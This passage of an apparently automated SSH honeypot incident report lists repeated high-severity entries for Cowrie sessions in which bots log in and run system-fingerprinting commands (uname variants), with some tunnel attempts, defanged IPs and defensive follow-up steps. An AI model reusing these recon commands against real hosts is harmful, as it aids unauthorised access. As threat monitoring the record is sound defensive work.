| `2026-07-26 21:59:55` | `cowrie.session.connect` |
| `2026-07-26 21:59:55` | `cowrie.client.version` |
| `2026-07-26 21:59:55` | `cowrie.client.kex` |
| `2026-07-26 21:59:55` | `cowrie.login.success` |
| `2026-07-26 21:59:56` | `cowrie.session.params` |
| `2026-07-26 21:59:56` | `cowrie.command.input` |
| `2026-07-26 21:59:56` | `cowrie.log.closed` |
| `2026-07-26 21:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95ba754cb160

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:01 |
| **Last Seen** | 2026-07-26 22:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:01:44` | `cowrie.session.connect` |
| `2026-07-26 22:01:44` | `cowrie.client.version` |
| `2026-07-26 22:01:45` | `cowrie.client.kex` |
| `2026-07-26 22:01:45` | `cowrie.login.success` |
| `2026-07-26 22:01:46` | `cowrie.session.params` |
| `2026-07-26 22:01:46` | `cowrie.command.input` |
| `2026-07-26 22:01:46` | `cowrie.log.closed` |
| `2026-07-26 22:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ed7f1c7b02

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:03 |
| **Last Seen** | 2026-07-26 22:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:03:39` | `cowrie.session.connect` |
| `2026-07-26 22:03:39` | `cowrie.client.version` |
| `2026-07-26 22:03:39` | `cowrie.client.kex` |
| `2026-07-26 22:03:39` | `cowrie.login.success` |
| `2026-07-26 22:03:40` | `cowrie.session.params` |
| `2026-07-26 22:03:40` | `cowrie.command.input` |
| `2026-07-26 22:03:40` | `cowrie.log.closed` |
| `2026-07-26 22:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afd50e0e6357

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:05 |
| **Last Seen** | 2026-07-26 22:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:05:37` | `cowrie.session.connect` |
| `2026-07-26 22:05:37` | `cowrie.client.version` |
| `2026-07-26 22:05:37` | `cowrie.client.kex` |
| `2026-07-26 22:05:37` | `cowrie.login.success` |
| `2026-07-26 22:05:38` | `cowrie.session.params` |
| `2026-07-26 22:05:38` | `cowrie.command.input` |
| `2026-07-26 22:05:38` | `cowrie.log.closed` |
| `2026-07-26 22:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b14129cc964

| Field | Detail |
|---|---|
| **Source IP** | `175.198.18[.]3` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:03` | `cowrie.session.connect` |
| `2026-07-26 22:07:05` | `cowrie.client.version` |
| `2026-07-26 22:07:05` | `cowrie.client.kex` |
| `2026-07-26 22:07:13` | `cowrie.login.success` |
| `2026-07-26 22:07:16` | `cowrie.direct-tcpip.request` |
| `2026-07-26 22:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `175.198.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f02b4ab2ebfd

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:07` | `cowrie.session.connect` |
| `2026-07-26 22:07:07` | `cowrie.client.version` |
| `2026-07-26 22:07:07` | `cowrie.client.kex` |
| `2026-07-26 22:07:09` | `cowrie.login.success` |
| `2026-07-26 22:07:10` | `cowrie.session.params` |
| `2026-07-26 22:07:10` | `cowrie.command.input` |
| `2026-07-26 22:07:10` | `cowrie.log.closed` |
| `2026-07-26 22:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775d78057a5c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:10` | `cowrie.session.connect` |
| `2026-07-26 22:07:11` | `cowrie.client.version` |
| `2026-07-26 22:07:11` | `cowrie.client.kex` |
| `2026-07-26 22:07:12` | `cowrie.login.success` |
| `2026-07-26 22:07:14` | `cowrie.session.params` |
| `2026-07-26 22:07:14` | `cowrie.command.input` |
| `2026-07-26 22:07:15` | `cowrie.log.closed` |
| `2026-07-26 22:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35d733e1ff79

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:16` | `cowrie.session.connect` |
| `2026-07-26 22:07:16` | `cowrie.client.version` |
| `2026-07-26 22:07:16` | `cowrie.client.kex` |
| `2026-07-26 22:07:18` | `cowrie.login.success` |
| `2026-07-26 22:07:19` | `cowrie.session.params` |
| `2026-07-26 22:07:19` | `cowrie.command.input` |
| `2026-07-26 22:07:21` | `cowrie.log.closed` |
| `2026-07-26 22:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc54f5926cd4

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:21` | `cowrie.session.connect` |
| `2026-07-26 22:07:21` | `cowrie.client.version` |
| `2026-07-26 22:07:21` | `cowrie.client.kex` |
| `2026-07-26 22:07:26` | `cowrie.login.success` |
| `2026-07-26 22:07:27` | `cowrie.session.params` |
| `2026-07-26 22:07:27` | `cowrie.command.input` |
| `2026-07-26 22:07:27` | `cowrie.log.closed` |
| `2026-07-26 22:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e6e628ff2aa

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]20` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:25` | `cowrie.session.connect` |
| `2026-07-26 22:07:26` | `cowrie.client.version` |
| `2026-07-26 22:07:26` | `cowrie.client.kex` |
| `2026-07-26 22:07:28` | `cowrie.login.success` |
| `2026-07-26 22:07:29` | `cowrie.direct-tcpip.request` |
| `2026-07-26 22:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]20` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a1d7977ebe

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:27` | `cowrie.session.connect` |
| `2026-07-26 22:07:27` | `cowrie.client.version` |
| `2026-07-26 22:07:27` | `cowrie.client.kex` |
| `2026-07-26 22:07:31` | `cowrie.login.success` |
| `2026-07-26 22:07:33` | `cowrie.session.params` |
| `2026-07-26 22:07:33` | `cowrie.command.input` |
| `2026-07-26 22:07:34` | `cowrie.log.closed` |
| `2026-07-26 22:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1321109862f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:29` | `cowrie.session.connect` |
| `2026-07-26 22:07:29` | `cowrie.client.version` |
| `2026-07-26 22:07:29` | `cowrie.client.kex` |
| `2026-07-26 22:07:29` | `cowrie.login.success` |
| `2026-07-26 22:07:30` | `cowrie.session.params` |
| `2026-07-26 22:07:30` | `cowrie.command.input` |
| `2026-07-26 22:07:30` | `cowrie.log.closed` |
| `2026-07-26 22:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e91c6f4898cc

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:34` | `cowrie.session.connect` |
| `2026-07-26 22:07:34` | `cowrie.client.version` |
| `2026-07-26 22:07:34` | `cowrie.client.kex` |
| `2026-07-26 22:07:36` | `cowrie.login.success` |
| `2026-07-26 22:07:37` | `cowrie.session.params` |
| `2026-07-26 22:07:37` | `cowrie.command.input` |
| `2026-07-26 22:07:38` | `cowrie.log.closed` |
| `2026-07-26 22:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ffa4107e33

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:38` | `cowrie.session.connect` |
| `2026-07-26 22:07:38` | `cowrie.client.version` |
| `2026-07-26 22:07:38` | `cowrie.client.kex` |
| `2026-07-26 22:07:39` | `cowrie.login.success` |
| `2026-07-26 22:07:41` | `cowrie.session.params` |
| `2026-07-26 22:07:41` | `cowrie.command.input` |
| `2026-07-26 22:07:42` | `cowrie.log.closed` |
| `2026-07-26 22:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0796b5d163

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:44` | `cowrie.session.connect` |
| `2026-07-26 22:07:45` | `cowrie.client.version` |
| `2026-07-26 22:07:45` | `cowrie.client.kex` |
| `2026-07-26 22:07:47` | `cowrie.login.success` |
| `2026-07-26 22:07:48` | `cowrie.session.params` |
| `2026-07-26 22:07:48` | `cowrie.command.input` |
| `2026-07-26 22:07:49` | `cowrie.log.closed` |
| `2026-07-26 22:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34a6c31bce5e

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:50` | `cowrie.session.connect` |
| `2026-07-26 22:07:50` | `cowrie.client.version` |
| `2026-07-26 22:07:50` | `cowrie.client.kex` |
| `2026-07-26 22:07:51` | `cowrie.login.success` |
| `2026-07-26 22:07:52` | `cowrie.session.params` |
| `2026-07-26 22:07:52` | `cowrie.command.input` |
| `2026-07-26 22:07:52` | `cowrie.log.closed` |
| `2026-07-26 22:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d668b137b915

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:52` | `cowrie.session.connect` |
| `2026-07-26 22:07:52` | `cowrie.client.version` |
| `2026-07-26 22:07:53` | `cowrie.client.kex` |
| `2026-07-26 22:07:54` | `cowrie.login.success` |
| `2026-07-26 22:07:55` | `cowrie.session.params` |
| `2026-07-26 22:07:55` | `cowrie.command.input` |
| `2026-07-26 22:07:56` | `cowrie.log.closed` |
| `2026-07-26 22:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c247ba32ddf

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:07 |
| **Last Seen** | 2026-07-26 22:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:07:56` | `cowrie.session.connect` |
| `2026-07-26 22:07:56` | `cowrie.client.version` |
| `2026-07-26 22:07:56` | `cowrie.client.kex` |
| `2026-07-26 22:07:58` | `cowrie.login.success` |
| `2026-07-26 22:07:59` | `cowrie.session.params` |
| `2026-07-26 22:07:59` | `cowrie.command.input` |
| `2026-07-26 22:08:00` | `cowrie.log.closed` |
| `2026-07-26 22:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-208fb80c6515

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:08 |
| **Last Seen** | 2026-07-26 22:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:08:00` | `cowrie.session.connect` |
| `2026-07-26 22:08:00` | `cowrie.client.version` |
| `2026-07-26 22:08:00` | `cowrie.client.kex` |
| `2026-07-26 22:08:02` | `cowrie.login.success` |
| `2026-07-26 22:08:03` | `cowrie.session.params` |
| `2026-07-26 22:08:03` | `cowrie.command.input` |
| `2026-07-26 22:08:03` | `cowrie.log.closed` |
| `2026-07-26 22:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfa523bd8bee

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:08 |
| **Last Seen** | 2026-07-26 22:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:08:03` | `cowrie.session.connect` |
| `2026-07-26 22:08:03` | `cowrie.client.version` |
| `2026-07-26 22:08:04` | `cowrie.client.kex` |
| `2026-07-26 22:08:05` | `cowrie.login.success` |
| `2026-07-26 22:08:06` | `cowrie.session.params` |
| `2026-07-26 22:08:06` | `cowrie.command.input` |
| `2026-07-26 22:08:07` | `cowrie.log.closed` |
| `2026-07-26 22:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4469d5e8f6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:08 |
| **Last Seen** | 2026-07-26 22:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:08:07` | `cowrie.session.connect` |
| `2026-07-26 22:08:07` | `cowrie.client.version` |
| `2026-07-26 22:08:07` | `cowrie.client.kex` |
| `2026-07-26 22:08:11` | `cowrie.login.success` |
| `2026-07-26 22:08:12` | `cowrie.session.params` |
| `2026-07-26 22:08:12` | `cowrie.command.input` |
| `2026-07-26 22:08:13` | `cowrie.log.closed` |
| `2026-07-26 22:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b571cf2ad7d

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:08 |
| **Last Seen** | 2026-07-26 22:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:08:13` | `cowrie.session.connect` |
| `2026-07-26 22:08:13` | `cowrie.client.version` |
| `2026-07-26 22:08:13` | `cowrie.client.kex` |
| `2026-07-26 22:08:15` | `cowrie.login.success` |
| `2026-07-26 22:08:17` | `cowrie.session.params` |
| `2026-07-26 22:08:17` | `cowrie.command.input` |
| `2026-07-26 22:08:17` | `cowrie.log.closed` |
| `2026-07-26 22:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c14c39a9c50

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]30` |
| **First Seen** | 2026-07-26 22:08 |
| **Last Seen** | 2026-07-26 22:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:08:17` | `cowrie.session.connect` |
| `2026-07-26 22:08:17` | `cowrie.client.version` |
| `2026-07-26 22:08:17` | `cowrie.client.kex` |
| `2026-07-26 22:08:18` | `cowrie.login.success` |
| `2026-07-26 22:08:19` | `cowrie.session.params` |
| `2026-07-26 22:08:19` | `cowrie.command.input` |
| `2026-07-26 22:08:19` | `cowrie.log.closed` |
| `2026-07-26 22:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]30` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf7faf3f994a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:09 |
| **Last Seen** | 2026-07-26 22:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:09:17` | `cowrie.session.connect` |
| `2026-07-26 22:09:17` | `cowrie.client.version` |
| `2026-07-26 22:09:17` | `cowrie.client.kex` |
| `2026-07-26 22:09:17` | `cowrie.login.success` |
| `2026-07-26 22:09:18` | `cowrie.session.params` |
| `2026-07-26 22:09:18` | `cowrie.command.input` |
| `2026-07-26 22:09:18` | `cowrie.log.closed` |
| `2026-07-26 22:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-307a72ba3f84

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:11 |
| **Last Seen** | 2026-07-26 22:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:11:07` | `cowrie.session.connect` |
| `2026-07-26 22:11:07` | `cowrie.client.version` |
| `2026-07-26 22:11:07` | `cowrie.client.kex` |
| `2026-07-26 22:11:07` | `cowrie.login.success` |
| `2026-07-26 22:11:08` | `cowrie.session.params` |
| `2026-07-26 22:11:08` | `cowrie.command.input` |
| `2026-07-26 22:11:08` | `cowrie.log.closed` |
| `2026-07-26 22:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14460dd25579

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:13 |
| **Last Seen** | 2026-07-26 22:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:13:00` | `cowrie.session.connect` |
| `2026-07-26 22:13:00` | `cowrie.client.version` |
| `2026-07-26 22:13:00` | `cowrie.client.kex` |
| `2026-07-26 22:13:00` | `cowrie.login.success` |
| `2026-07-26 22:13:01` | `cowrie.session.params` |
| `2026-07-26 22:13:01` | `cowrie.command.input` |
| `2026-07-26 22:13:01` | `cowrie.log.closed` |
| `2026-07-26 22:13:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
